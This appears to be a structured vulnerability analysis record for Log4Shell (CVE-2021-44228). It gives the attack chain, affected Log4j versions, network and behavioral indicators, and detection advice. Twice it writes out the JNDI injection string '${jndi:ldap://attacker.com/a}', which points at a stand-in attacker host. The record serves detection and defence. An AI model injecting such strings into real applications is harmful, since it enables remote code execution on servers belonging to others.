package_info.why_malicious: The affected versions of Log4j contain a critical remote code execution vulnerability (Log4Shell, CVE-2021-44228) that allows attackers to execute arbitrary code on the server by manipulating log messages. This vulnerability is actively exploited and can result in full system compromise.

execution_context.trigger: runtime (when a log message is processed)
execution_context.file_location: Any Java class or application code that uses Log4j to log user-controlled input

malicious_snippets.code_behavior: This code logs attacker-controlled input using Log4j. If the input contains a JNDI lookup string (e.g., ${jndi:ldap://attacker.com/a}), Log4j will perform a remote lookup and may execute code from the attacker's server.

malice_analysis.why_suspicious: Logging unsanitized user input with vulnerable Log4j versions enables remote code execution via JNDI injection.
malice_analysis.violated_expectations: Normal logging frameworks should not allow log message content to trigger network lookups or code execution. Here, user input can trigger dangerous behavior.
malice_analysis.similar_legitimate_use: Logging user input is common, but should not result in code execution or network access.
key_indicators: Presence of ${jndi:...} patterns in log messages

attack_chain.action: Attacker sends specially crafted input containing a JNDI lookup string (e.g., ${jndi:ldap://attacker.com/a}) to the application.
attack_chain.leads_to: Input is processed by application code.

attack_chain.action: Application logs the attacker-controlled input using Log4j.
attack_chain.leads_to: Log4j processes the log message and detects the JNDI pattern.

attack_chain.action: Log4j performs a JNDI lookup to the attacker-controlled server.
attack_chain.leads_to: Remote code or serialized object is fetched and executed, leading to code execution.

attack_chain.action: Attacker gains remote code execution on the server.

behavioral_signatures: Log messages containing ${jndi:ldap://...} or similar patterns
Unexpected outbound LDAP, RMI, or other JNDI-related network requests from application servers
Execution of code or loading of classes from remote servers during log processing
file_indicators: Presence of log4j-core-2.0-beta9.jar through log4j-core-2.14.1.jar in application dependencies
Application code that logs unsanitized user input
network_indicators: Outbound LDAP, RMI, or other JNDI protocol requests to untrusted or external hosts
Connections to attacker-controlled infrastructure following log events
detection_knowledge.how_to_detect: Monitor application logs for suspicious patterns such as ${jndi:...}. Inspect dependencies for vulnerable Log4j versions. Use network monitoring to detect unexpected outbound JNDI-related traffic. Review code for logging of unsanitized user input. Employ runtime protection to block or alert on JNDI lookups originating from log processing.
